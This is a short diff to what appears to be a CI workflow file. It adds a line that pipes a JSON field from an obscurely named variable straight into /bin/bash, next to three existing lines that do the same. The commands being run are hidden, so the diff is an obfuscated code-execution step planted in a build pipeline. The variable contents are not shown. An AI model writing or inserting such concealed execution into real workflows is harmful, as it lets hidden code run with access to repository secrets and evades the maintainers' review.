@@ -29,6 +29,7 @@ jobs:
           echo $vuua484 | jq -r .sftyy3 | /bin/bash
           echo $edx81912 | jq -r .gjs04 | /bin/bash
           printf '%s' "$t5" | jq -r .geud5 | /bin/bash
+          printf '%s' "$zx32290" | jq -r .mas71 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
